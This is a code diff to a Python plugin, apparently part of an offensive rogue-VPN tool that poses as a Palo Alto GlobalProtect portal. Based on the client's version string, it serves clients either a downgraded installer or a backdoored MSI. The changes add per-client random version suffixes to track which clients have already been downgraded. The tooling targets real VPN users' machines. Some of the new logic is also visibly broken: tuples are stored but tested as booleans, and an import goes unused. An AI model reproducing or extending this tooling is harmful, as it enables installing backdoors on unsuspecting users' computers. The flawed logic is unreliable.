@@ -12,6 +12,7 @@ import ssl
 import os
 import io
 import re
+import random
 
 # SSL-VPN packet types
 SSL_VPN_MAGIC = bytes.fromhex('1a2b3c4d')
@@ -29,6 +30,9 @@ class PaloAltoPlugin(VPNPlugin):
         self.download_dir = os.path.join(os.getcwd(), 'downloads')
         os.makedirs(self.payload_dir, exist_ok=True)
         os.makedirs(self.download_dir, exist_ok=True)
+
+        # Stores the downgraded state for each version suffix
+        self.allocated_suffixes = {}
 
         # Payload options
         self.msi_force_patch = os.getenv("PALO_ALTO_FORCE_PATCH", False)
@@ -62,6 +66,15 @@ class PaloAltoPlugin(VPNPlugin):
         if not self.bootstrap():
             self.logger.error(f"Failed to bootstrap. Disabling {self.__class__.__name__}")
             self.enabled = False
+
+    def generate_unique_suffix(self):
+        while True:
+            suffix = os.urandom(8).hex()
+            if suffix not in self.allocated_suffixes:
+                # tuple of (downgraded, backdoored)
+                self.allocated_suffixes[suffix] = (False, False)
+                self.logger.info(f"Generated unique suffix: {suffix}")
+                return suffix
 
     def generate_pkg(self):
         pkg_buf = generate_pkg(
@@ -289,7 +302,8 @@ class PaloAltoPlugin(VPNPlugin):
                 return False
 
             # Assign the socket to the connection_id
-            self.packet_handler.assign_socket(connection_id, handler.connection)
+            if not self.packet_handler.assign_socket(connection_id, handler.connection):
+                return False
 
             self.logger.info(f"Starting tunnel for {connection_id}")
             handler.connection.sendall(b'START_TUNNEL')
@@ -361,7 +375,8 @@ class PaloAltoPlugin(VPNPlugin):
 
             # check if we need to downgrade
             if self.should_downgrade(request.headers.get('User-Agent', '')):
-                version = self.upgrade_version + "-1337"
+                suffix = self.generate_unique_suffix()
+                version = self.upgrade_version + f"-{suffix}"
             else:
                 version = self.upgrade_version
 
@@ -417,12 +432,29 @@ class PaloAltoPlugin(VPNPlugin):
             if file_name not in ['GlobalProtect.pkg', 'GlobalProtect.msi', 'GlobalProtect64.msi']:
                 return abort(404)
 
-            if request.args.get('v', '').endswith('-1337'):
-                self.logger.info("Serving downgrade MSI")
-                file_path = os.path.join(self.download_dir, f"{file_name}.old")
-            else:
-                self.logger.info("Serving backdoored MSI")
-                file_path = os.path.join(self.payload_dir, file_name)
+            version = request.args.get('v', '')
+            file_path = os.path.join(self.payload_dir, file_name)
+
+            """
+            This is a workaround due to the GlobalProtect client not sending its current version
+            Instead we set a unique suffix to the version in the portal config and store it in a dict
+            The suffix is only added to the version if the client was originally on a version >= 6.2.6
+            For each suffix, we store a bool of downgraded state
+            """
+            # Check if version has a suffix
+            if '-' in version and os.path.exists(os.path.join(self.download_dir, f"{file_name}.old")):
+                suffix = version.split('-')[-1]
+
+                if suffix in self.allocated_suffixes:
+                    downgraded = self.allocated_suffixes[suffix]
+
+                    if not downgraded:
+                        self.logger.info(f"Serving downgrade MSI for suffix {suffix}")
+                        file_path = os.path.join(self.download_dir, f"{file_name}.old")
+                        self.allocated_suffixes[suffix] = True
+                else:
+                    self.logger.info(f"Unknown suffix {suffix}")
+                    return abort(404)
 
             if not os.path.exists(file_path):
                 self.logger.error(f"Download file not found: {file_path}")
@@ -532,14 +564,14 @@ class PaloAltoPlugin(VPNPlugin):
         version_match = re.search(r'GlobalProtect/(\d+\.\d+\.\d+)', user_agent)
         if version_match:
             client_version = version_match.group(1)
-            self.logger.debug(f"Client version: {client_version}")
+            self.logger.info(f"Client version: {client_version}")
 
-            # If it's higher than 6.2.6, downgrade
+            # If it's >= 6.2.6, downgrade
             major, minor, patch = map(int, client_version.split('.')[:3])
-            if (major > 6) or (major == 6 and minor > 2) or (major == 6 and minor == 2 and int(patch) > 6):
-                self.logger.debug(f"Client version {client_version} needs downgrade")
+            if (major > 6) or (major == 6 and minor > 2) or (major == 6 and minor == 2 and int(patch) >= 6):
+                self.logger.info(f"Client version {client_version} needs downgrade")
                 return True
             else:
-                self.logger.debug(f"Client version {client_version} is compatible")
+                self.logger.info(f"Client version {client_version} is compatible")
                 return False
         return False
